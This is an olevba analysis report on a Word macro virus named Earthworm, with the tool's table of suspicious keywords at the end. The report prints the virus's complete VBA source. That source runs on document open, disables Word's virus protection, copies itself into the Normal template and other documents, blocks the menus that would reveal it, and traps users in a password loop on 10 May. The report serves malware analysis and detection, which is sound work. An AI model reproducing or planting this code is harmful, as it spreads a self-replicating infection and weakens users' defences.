olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Earthworm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Earthworm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Earthworm.bas 
in file: Virus.MSWord.Earthworm - OLE stream: 'Macros/VBA/Earthworm'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub AutoOpen()
On Error Resume Next
Application.Options.VirusProtection = False
Application.EnableCancelKey = wdCancelDisabled
If Month(Now()) = 5 And Day(Now()) = 10 Then
Birthday:
 If InputBox("May I know which heautiful teacher's birthday is today ?", "Happy birthday") = "Earthworm" Then
        MsgBox "Today is the birthday of the earthworm.", vbInformation, "Happy birthday"
    Exit Sub
 End If
GoTo Birthday
End If
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "Earthworm" Then v = True
Next
If v = False Then
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Earthworm", Object:=wdOrganizerObjectProjectItems
    Application.ActiveDocument.Save
End If
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(x).Name = "Earthworm" Then v = False
Next
If v = True Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Earthworm", Object:=wdOrganizerObjectProjectItems
    Application.Options.SaveNormalPrompt = False
End If
End Sub
Public Sub FormatStyle()
Explain
End Sub
Public Sub Organizer()
Explain
End Sub
Public Sub ToolsMacro()
Explain
End Sub
Public Sub FileTemplates()
Explain
End Sub
Public Sub ViewVBCode()
Explain
End Sub
Public Sub Explain()
MsgBox "Sorry, your word has macro virus", vbSystemModal, "Warning!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

